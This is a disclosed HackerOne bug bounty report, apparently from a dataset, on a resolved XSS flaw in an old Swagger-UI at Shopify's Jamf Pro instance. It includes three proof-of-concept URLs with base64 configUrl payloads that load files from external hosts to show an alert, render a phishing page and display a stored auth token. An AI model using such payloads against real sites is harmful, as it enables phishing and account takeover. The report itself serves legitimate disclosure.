---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1444682'
original_report_id: '1444682'
title: XSS at jamfpro.shopifycloud.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: shopify
created_at: '2022-01-09T21:17:19.843Z'
disclosed_at: '2023-02-02T20:45:36.248Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 210
asset_identifier: '*.shopifycloud.com'
asset_type: WILDCARD
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS at jamfpro.shopifycloud.com

## Metadata

- HackerOne Report ID: 1444682
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: shopify
- Disclosed At: 2023-02-02T20:45:36.248Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

*Description*
There is Jamf Pro running at https://jamfpro.shopifycloud.com/ which has old Swagger-UI exposed at /classicapi/doc/. I think it's possible to take over the Jamf Pro account of the user that clicks the link. (more about that below) 

*Steps to reproduce*

**POC with simple alert box**:
1. Open `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
2. You should see an alert box (F1573391)

**POC rendering phishing page**:
1. Click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9`
2. You should see a phishing page rendered (F1573392)

**POC of stealing auth token**:
Jamf Pro stores authentication token in localstorage under `authToken` key when you authenticate using login and password, so my assumption is that it will do the same for Saml authentication. (you will have to test that) If it's true then taking over the user's account who clicked the link would be trivial. The POC below will print `authToken` from localstorage.

1. Authenticate to `jamfpro.shopifycloud.com` and click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
2. You should see an alert box with auth token. 

## Impact

An attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.

## Impact

An attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
